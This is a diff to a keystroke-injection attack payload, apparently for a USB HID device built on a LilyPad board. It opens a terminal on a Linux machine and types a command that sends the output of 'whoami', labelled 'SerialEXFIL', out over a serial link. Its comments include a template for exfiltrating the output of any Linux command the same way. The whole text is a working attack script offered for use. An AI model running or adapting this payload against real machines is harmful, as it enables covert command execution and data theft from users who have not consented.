@@ -2,8 +2,7 @@ Rem: Exfiltrate UserName from Linux Box using a Serial Link
 Press:134+195
 PrintLine:gnome-terminal
 CustomDelay:1000
-Rem: Some situations require a delay right before exfiltrating data so the below command has a 5s sleep delay but this is not always required
-PrintLine:sleep 5; stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(whoami) > /dev/serial/by-id/*LilyPad*
+PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(whoami) > /dev/serial/by-id/*LilyPad* &
 Rem: More examples below
 Rem: PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(whoami) > /dev/serial/by-id/*LilyPad*
 Rem: In example below replace "LINUX COMMAND HERE": PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(LINUX COMMAND HERE) > /dev/serial/by-id/*LilyPad*
